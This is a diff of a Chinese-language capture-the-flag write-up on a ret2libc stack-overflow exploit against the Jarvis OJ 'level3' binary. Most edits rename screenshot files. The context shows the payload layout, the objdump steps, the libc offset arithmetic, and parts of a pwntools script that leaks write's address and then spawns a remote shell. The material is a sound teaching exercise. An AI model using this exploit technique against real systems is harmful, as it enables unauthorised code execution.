@@ -10,7 +10,7 @@ EIP一旦改写成system函数地址后，那执行system函数时，它需要�
 
 
 ret2libc执行system的堆栈布局
-![](README/7697DC1F-431E-4EAF-BB2E-FFE581348713%203.png)
+![](README/7697DC1F-431E-4EAF-BB2E-FFE581348713%204.png)
 
 linux x86函数执行的时候，在刚刚进入system函数的时候，会默认push一个返回地址，然后才是system的参数，所以如果我们想得到一个shell的话，system地址中间需要随便加一个以作为间隔
 
@@ -30,18 +30,18 @@ A*N + system_addr + exit_addr + arg
 
 
 ## 0x01 信息检查
-![](README/1A54F82A-57B0-4AB5-B2F8-8EB1D2B2D117%203.png)
+![](README/1A54F82A-57B0-4AB5-B2F8-8EB1D2B2D117%204.png)
 
 
-![](README/E34CC7F9-2783-4D0B-9F62-FB364E86F382%203.png)
-![](README/F184F5E1-5DCB-4B76-B7B1-6BEDB314AB2E%203.png)
+![](README/E34CC7F9-2783-4D0B-9F62-FB364E86F382%204.png)
+![](README/F184F5E1-5DCB-4B76-B7B1-6BEDB314AB2E%204.png)
 
 
  vulnerable_function函数存在漏洞，但是显然，程序里没有getshell的方法，然后把目光投到libc-2.19.so文件上
-![](README/E5A21D0A-CCB5-4703-BBAC-2EAE42FB16F0%203.png)
+![](README/E5A21D0A-CCB5-4703-BBAC-2EAE42FB16F0%204.png)
 
 system函数有
-![](README/182046EF-DAB6-437B-8C53-7EA6AE578087%203.png)
+![](README/182046EF-DAB6-437B-8C53-7EA6AE578087%204.png)
 
 _bin_sh函数有
 
@@ -60,11 +60,11 @@ write_target_addr - write_libc = system_target_addr - system_libc
 objdump -d -j .plt level3
 ```
 
-![](README/F410D590-911A-4233-8C4F-2E5FE9D4B406%203.png)
+![](README/F410D590-911A-4233-8C4F-2E5FE9D4B406%204.png)
 
 write@plt的地址是0x08048340,这和IDA中的数据是一样的
 
-![](README/08E6B311-E384-4FB2-B146-BDE52E44CBA5%202.png)
+![](README/08E6B311-E384-4FB2-B146-BDE52E44CBA5%203.png)
 
 
 获取程序的got(全局偏移表)
@@ -72,7 +72,7 @@ write@plt的地址是0x08048340,这和IDA中的数据是一样的
 objdump -R level3
 ```
 
-![](README/462A0988-1F88-4679-AD9F-9C06A05775CC%203.png)
+![](README/462A0988-1F88-4679-AD9F-9C06A05775CC%204.png)
 write@got是0x0804a018
 
 
@@ -80,7 +80,7 @@ write@got是0x0804a018
 1. 读取Write的GOT表项在内存中的地址write@plt
 2. 通过给予的glibc的信息和write的偏移量write_offset来计算libc在内存中的基地址base = write@plt - write_offset
 3. 通过glibc和基地址获取system和’_bin_sh’的地址，构造ROP
-![](README/4928C008-E89E-481C-B70A-3920AC6FF391%202.png)
+![](README/4928C008-E89E-481C-B70A-3920AC6FF391%203.png)
 
 获取write函数的plt和got的地址的方式:
 从levvel3中获取write的plt地址和got地址
@@ -111,14 +111,14 @@ print(write_got)
 
 ```
 
-![](README/058C3999-28A7-4280-8A5F-DA18FE0E59AB%202.png)
+![](README/058C3999-28A7-4280-8A5F-DA18FE0E59AB%203.png)
 
 还需要获取一个函数的返回地址
-![](README/93AB3FA5-DF43-4F54-93F4-F63BB5DA59F3%202.png)
+![](README/93AB3FA5-DF43-4F54-93F4-F63BB5DA59F3%203.png)
 
 vulnerable_function的返回地址是0804844B
 
-![](README/87ADDFB4-A8FA-4D7C-BFD4-ED0CE3171297%202.png)
+![](README/87ADDFB4-A8FA-4D7C-BFD4-ED0CE3171297%203.png)
 gdb调试的结果是一样的
 
 
@@ -128,7 +128,7 @@ payload = 一般是填充字符（栈的大小）+ ‘aaaa’（覆盖EBP）+  
 ```
 
 
-![](README/9702F114-D250-4A58-B55C-BB0646880E3D%202.png)
+![](README/9702F114-D250-4A58-B55C-BB0646880E3D%203.png)
 获得了write函数的基地址就是4150267872
 ```python
 #coding=utf-8
@@ -173,21 +173,19 @@ print(writeaddr)
 根据公示
 write_target_addr - write_libc = system_target_addr - system_libc
 system_target_add = write_target_addr - write_libc  + system_libc
-要想知道system_target_add的地址还需要知道 write和system
-
-的偏移地址，还是利用万能的ida打开so文件
-![](README/233FC23C-1DED-4AF7-9D01-7F000DD7908A%202.png)
+要想知道system_target_add的地址还需要知道 write和system的偏移地址，还是利用万能的ida打开so文件
+![](README/233FC23C-1DED-4AF7-9D01-7F000DD7908A%203.png)
 
 system的偏移地址是0x00040310	
 
-![](README/0D4E3213-9924-4DB6-B383-B8B28E06E7C3%202.png)
+![](README/0D4E3213-9924-4DB6-B383-B8B28E06E7C3%203.png)
 
 write的偏移地址就是 0x000DAFE0	
 
-![](README/6A8B82DE-9E67-47C0-878C-FE93D2B6A125%202.png)
+![](README/6A8B82DE-9E67-47C0-878C-FE93D2B6A125%203.png)
 
 _bin_sh的偏移地址就是0x0016084C
-![](README/0362B411-EC91-4C5D-8222-4C680F4E164B%202.png)
+![](README/0362B411-EC91-4C5D-8222-4C680F4E164B%203.png)
 
  最后的全量代码就是
 ```python
@@ -238,7 +236,7 @@ conn.send(payload)
 conn.interactive()
 ```
 
-![](README/D27D2B8E-B436-4DCD-BBB1-439A6141A73C%202.png)
+![](README/D27D2B8E-B436-4DCD-BBB1-439A6141A73C%203.png)
 
 
 
@@ -253,6 +251,7 @@ from pwn import *
 io = remote("pwn2.jarvisoj.com",9879)
 elf = ELF("./level3")
 
+#这些数据都是level3文件提供的
 writeplt = elf.plt["write"]
 writegot = elf.got["write"]
 func = elf.symbols["vulnerable_function"]
